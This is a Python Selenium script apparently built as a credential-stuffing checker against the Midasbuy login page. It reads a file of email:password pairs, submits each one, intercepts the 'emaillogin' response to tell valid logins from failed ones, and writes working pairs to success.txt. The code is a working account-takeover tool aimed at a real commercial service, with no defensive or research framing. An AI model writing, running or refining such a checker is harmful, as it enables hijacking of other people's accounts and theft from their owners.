import time
import json
import sys
import os
from seleniumwire import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC


def setup_driver():
    chrome_options = Options()

    # ⚠️ جرّب بدون headless أول مرة للاستقرار
    # chrome_options.add_argument("--headless")

    chrome_options.add_argument("--no-sandbox")
    chrome_options.add_argument("--disable-dev-shm-usage")
    chrome_options.add_argument("--window-size=1920,1080")

    # Chromium path (snap)
    chrome_options.binary_location = "/snap/bin/chromium"

    driver = webdriver.Chrome(options=chrome_options)
    return driver


def save_success(email, password):
    with open("success.txt", "a") as f:
        f.write(f"{email}:{password}\n")


def login_and_intercept(email, password):
    driver = setup_driver()
    is_success = False

    try:
        print(f"\n[*] Processing: {email}")
        driver.get("https://www.midasbuy.com/midasbuy/eg/login#login")

        wait = WebDriverWait(driver, 20)

        # cookies (اختياري)
        try:
            reject_btn = wait.until(
                EC.element_to_be_clickable((By.ID, "cookieBtn"))
            )
            reject_btn.click()
            print("[+] Cookies handled")
            time.sleep(1)
        except:
            pass

        # inputs
        email_input = wait.until(
            EC.presence_of_element_located((By.ID, "loginUsername"))
        )
        password_input = driver.find_element(By.ID, "loginPassword")
        login_button = driver.find_element(By.ID, "loginButton")

        print("[*] Entering credentials...")
        email_input.clear()
        password_input.clear()

        email_input.send_keys(email)
        password_input.send_keys(password)

        # clear old requests
        driver.requests.clear()

        login_button.click()

        print("[*] Waiting for emaillogin request...")

        start_time = time.time()
        seen = set()

        while time.time() - start_time < 20:
            for request in driver.requests:

                if request.url in seen:
                    continue
                seen.add(request.url)

                if "emaillogin" in request.url:

                    print(f"[+] Request found: {request.url}")

                    if request.response:
                        print(f"Status: {request.response.status_code}")

                        try:
                            body = request.response.body.decode(
                                "utf-8", errors="ignore"
                            )

                            try:
                                resp_json = json.loads(body)
                            except:
                                print("[-] Response not JSON")
                                break

                            error_code = resp_json.get("data", {}).get("ErrorCode")

                            if error_code == 0:
                                print(f"✅ SUCCESS: {email}")
                                save_success(email, password)
                                is_success = True
                            else:
                                print(f"❌ FAILED: {email}")

                        except Exception as e:
                            print(f"[!] Decode error: {e}")

                    return is_success

            time.sleep(1)

        print(f"[-] Request not found for {email}")

    except Exception as e:
        print(f"[!] Error: {email} -> {e}")

    finally:
        driver.quit()

    return is_success


if __name__ == "__main__":

    if len(sys.argv) < 2:
        print("Usage: python midas_login.py accounts.txt")
        sys.exit(1)

    file_path = sys.argv[1]

    if not os.path.exists(file_path):
        print("File not found")
        sys.exit(1)

    with open(file_path, "r") as f:
        lines = f.readlines()

    print(f"[*] Loaded {len(lines)} accounts")

    for line in lines:
        line = line.strip()

        if ":" not in line:
            continue

        email, password = line.split(":", 1)

        login_and_intercept(email, password)
        print("-" * 40)
